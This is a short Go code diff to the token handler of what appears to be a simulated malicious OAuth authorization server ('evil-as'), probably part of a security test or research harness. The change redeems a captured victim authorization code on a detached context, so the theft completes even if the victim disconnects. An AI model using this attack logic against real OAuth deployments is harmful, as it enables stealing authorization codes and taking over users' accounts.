@@ -222,7 +222,12 @@ func (c *config) handleToken(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	body, status, err := c.redeemAtHonest(r.Context(), form)
+	// Redeem on a detached context: once evil-as has the code, the theft must
+	// complete even if the victim client disconnects right after posting it —
+	// the attacker does not depend on the victim keeping the connection open.
+	redeemCtx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+	body, status, err := c.redeemAtHonest(redeemCtx, form)
 	if err != nil {
 		slog.Error("evil-as failed to redeem captured code", "err", err)
 		writeOAuthError(w, http.StatusBadGateway, "server_error",
